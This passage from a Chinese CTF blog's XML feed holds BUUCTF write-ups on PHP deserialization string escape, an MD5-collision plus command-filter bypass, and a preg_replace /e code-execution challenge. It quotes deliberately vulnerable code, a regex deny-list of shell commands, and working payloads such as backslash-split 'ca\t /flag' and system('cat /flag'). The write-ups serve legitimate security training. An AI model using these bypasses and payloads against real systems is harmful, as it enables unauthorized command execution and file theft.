class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;defg&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>); <span class="comment">//a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));    </span><br><span class="line"><span class="comment">// 添加 i:2;s:4:&quot;love&quot;;&#125;</span></span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;love&quot;;&#125;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682744765971-b50d2065-4da4-4695-b8cc-2ab0ab675374.png" alt="image.png"></p><p>本地测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> =<span class="string">&#x27;/flag/&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>]=<span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>]=<span class="string">&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;img&quot;</span>]=<span class="string">&#x27;L2QwZzNfZmxsbGxsbGFn&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="variable">$a</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030400496-4b376af4-9be1-4dab-a2b5-42423e634d5d.png" alt="img"></p><p>就是通过特意构造序列化 让$_SESSION[“function”]中的内容仿照反序列化后的$_SESSION[img]数组内容 从而达到覆盖</p><p>当$_SESSION[‘user’]中的24个字符被空字符代替之后 之后反序列化就会继续向后面寻找24个字符找到符合条件的内容进行反序列化读取<code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code>这24个字符 并且之后还有<code>&quot;;</code>符合停止的条件 而后继续向后读取img的20个字符，第四个、第五个s向后读取均满足规则。</p><p>这里需要注意的点：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030563480-6f3a3535-4f70-44d3-9e72-3e42f519886c.png" alt="img"></p><p>这里<code>&#39;a&quot;</code>左边的单引号是去闭合者一整段字符串右边的单引号</p><p>右边的双引号是为了去闭合序列化后的<code>&quot;a&quot;</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030860232-9241224d-6736-4a96-9bad-e37f51653091.png" alt="img"></p><p>为什么是4个flag 即24个字符 要根据后面构造的内容去灵活变动</p><p>然后是<code>&#125;</code>构造的字符串中有一个<code>&#125;</code>这个很重要 一开始本地测试的一直报错 发现是把这个<code>&#125;</code>给删了 这个<code>&#125;</code>是用来之后反序列化时候匹配停止匹配的一个符号吧（我是这样认为的）如果不加就会导致沙箱逃逸失败</p><p>然后因为在文件包含之前会有base64解码 需要把我们发现的php文件进行base64加密之后 弄进我们构造的字符串中 </p><p>之后题目就迎刃而解了。</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化字符串逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-44-[安洵杯 2019]easy_web</title>
      <link href="/post/6fcfe2b3.html"/>
      <url>/post/6fcfe2b3.html</url>
      
        <content type="html"><![CDATA[<p>[安洵杯 2019]easy_web</p><span id="more"></span><p>打开题目抓包分析：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855227157-8e11fe84-0449-443a-8d14-66b419638837.png" alt="img"></p><p>发现图片是通过base64编码进行输出的 看了大佬的wp <code>img=TXpVek5UTTFNbVUzTURabE5qYz0</code> 即文件名是先进行十六进制编码在进行两次base64编码 解码查看原文件名</p><p>第一次：base64</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855430402-2aaa6b54-1704-4a6d-9216-56d539fa2811.png" alt="img"></p><p>第二次: base64 得到hex编码数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855472959-be5e14ca-4885-4c53-8f03-1d2b031eb8d5.png" alt="img"></p><p>第三次：在进行十六进制解码</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855501090-18a10c84-e855-4363-9d00-37618cb88138.png" alt="img"></p><p>那么我们可以这种方式进行构造查看index.php</p><p>爆出源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi~ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码分析： </p><p>get方式传入cmd 但是要进行一个正则匹配</p><p>再通过 post方式传a与b 要求a与b不相等 但是md5加密后相等</p><p>先来看正则匹配</p><p>河蟹了一些常用的linux命令和一些字符  这里重点来看一下反斜杠的屏蔽 其实这道题这里匹配反斜杠出现问题了</p><p>本地测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;\\&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856125949-61736d5d-4b4e-4f84-839e-df9dfa4ed823.png" alt="img"><code>|\\|\\\\|</code> 这里两个反斜杠的第二个反斜杠转义了第二个<code>|</code> 使得这一块出现了错误</p><p>最终这里就是匹配 <code>\|\\\\</code>这一块 因此可以用反斜杠</p><p>本地测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;\|\\\\&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856091671-e7091ec9-b81a-4757-9431-b32fc21a3a06.png" alt="img"></p><p>但是如果我们想匹配一个<code>\</code> 那么我们在编写正则的时候就需要<code>\\\</code>来达到匹配一个<code>\</code>的效果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;\\&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856165041-ec8b1553-a9ed-4c29-8092-e50c61727e41.png" alt="img"></p><p>接着来看第二部分md5强相等</p><p>一开始我是想通过数组方式绕过 但是这道题在post a和b值后对他们进行了强制转换为字符串类型 因此不能用数组绕过了</p><p>只能用一个脚本进行md5碰撞 使得两个字符的md5值强相等</p><p>只能借助fastcoll这个工具 具体参考：<a href="https://blog.csdn.net/shuaicenglou3032/article/details/118197904?ops_request_misc=%7B%22request_id%22:%22167785642816800213071097%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167785642816800213071097&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-118197904-null-null.142%5Ev73%5Einsert_down3,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=fastcoll&spm=1018.2226.3001.4187">https://blog.csdn.net/shuaicenglou3032/article/details/118197904?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522167785642816800213071097%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id&#x3D;167785642816800213071097&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduend~default-1-118197904-null-null.142^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term&#x3D;fastcoll&amp;spm&#x3D;1018.2226.3001.4187</a> 这篇文章</p><p>注意最后生成的结果是通过url编码后的 如果不进行url编码 那么结果会出现乱码 本地测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-%E8%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87K%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3Fl%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%87P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1Al%EDP%2C%D5%18Q9%EB%B6%89ZW%F4%E5iOa%B0&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-h%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87%CB%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3F%EC%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%07P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1A%EC%ECP%2C%D5%18Q9%EB%B6%89ZW%F4eiOa%B0&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;--------------------------------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>))===<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856630211-e345d088-4b18-477d-b771-d38e62a64410.png" alt="img"></p><p>因为我们提交的内容会被浏览器默认url解码一次 所以结果都是一样的</p><p>但是我们查读文件所需的 <code>ls cat</code>都被正则匹配了这里应该怎么绕过呢</p><p>第一种方式：</p><p>可以用<code>dir</code>来代替<code>ls</code> 进行浏览文件</p><p>作用和<code>ls</code>一样</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857170069-3d416306-3483-485a-8c98-90b3fa7d5970.png" alt="img"></p><p><code>sort</code>代替<code>cat</code>进行读文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857270604-b9b7b79c-de53-4bd1-a023-fcc8b44a3134.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857752295-1bffe6b1-fa37-47d1-86ec-954c63aef05f.png" alt="img"></p><p>注意这里抓包payload的时候要将提交方式改为post 第一次做一直都是get传参一直没做出来 之后才发现要将bp的传参方式改为post 空格用url编码方式<code>%20</code>细节很重要</p><p>构造payload：<code>?cmd=dir%20/</code></p><p>post:<code>a=fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-%E8%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87K%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3Fl%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%87P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1Al%EDP%2C%D5%18Q9%EB%B6%89ZW%F4%E5iOa%B0&amp;b=fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-h%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87%CB%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3F%EC%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%07P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1A%EC%ECP%2C%D5%18Q9%EB%B6%89ZW%F4eiOa%B0</code><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857467024-2f3e1f70-d3ea-4a45-be27-295350e349e9.png" alt="img"></p><p>构造payload：<code>?cmd=sort%20/flag</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857524959-3e9deaf5-07fe-4452-bb95-4a93d916f4fd.png" alt="img"></p><p>第二种方式 之前说正则匹配没有过滤反斜杠</p><p>反斜杠在linux命令中也是起着转义的意义 那么在字母前加<code>\</code>就等于没加 <code>\n</code>这种特殊情况除外</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857770921-1b917b10-6346-4376-85f9-ee34ce0e440f.png" alt="img"></p><p>那么就可以在命令中添加反斜杠进行绕过正则匹配</p><p>构造payload:<code>?cmd=l\s%20/</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857842519-a139ce6f-740f-4d26-9491-5b54072c5a5c.png" alt="img"></p><p>再构造：<code>?cmd=ca\t%20/flag</code></p><p>成功</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857890453-7b478239-0e35-4be4-849a-e51c406b7fc6.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bypass </tag>
            
            <tag> md5强相等碰撞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-40-[BJDCTF2020]ZJCTF，不过如此</title>
      <link href="/post/ed5a1437.html"/>
      <url>/post/ed5a1437.html</url>
      
        <content type="html"><![CDATA[<p>[BJDCTF2020]ZJCTF，不过如此</p><span id="more"></span><p>先是一个代码审计和之前一个反序列化题目很像，就是一个伪协议的利用 </p><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure><p>得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这里涉及到preg_replace() &#x2F;e模式的漏洞 将用于替换的部分当作php代码执行 参考：<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><p>这里<code>\\1</code> 其实就是 <code>\1</code> 第一个 <code>\ </code>用于转义了 那么结果就是<code>\1</code> 在这里是反向引用 由于我这里没搞太明白 </p><p>这类题直接用模板答案就行<code>\S*=$&#123;命令执行&#125;</code> 大佬总结的很全 </p><p>思路就是调用getFlag()函数 然后cmd&#x3D; 命令执行</p><p><code>/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code> 注意是在next.php 下提交get传参</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677250464663-0534828a-c656-49be-a906-3aaaf89394b0.png" alt="img"></p><p>这里foreach搭配<code>$_GET</code>有特殊的用法 注意这里不是<code>$_GET[]</code></p><p>本地搭了一个环境测试了一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677250349098-0aa84b36-823c-4a2d-91d8-c76fcbe35c26.png" alt="img"></p><p>简单说就是形如a&#x3D;b的形式变量名和值分成两个变量来使用 蛮神奇的</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> preg_replace() /e </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 39-[BSidesCF 2020]Had a bad day</title>
      <link href="/post/78a48903.html"/>
      <url>/post/78a48903.html</url>
      
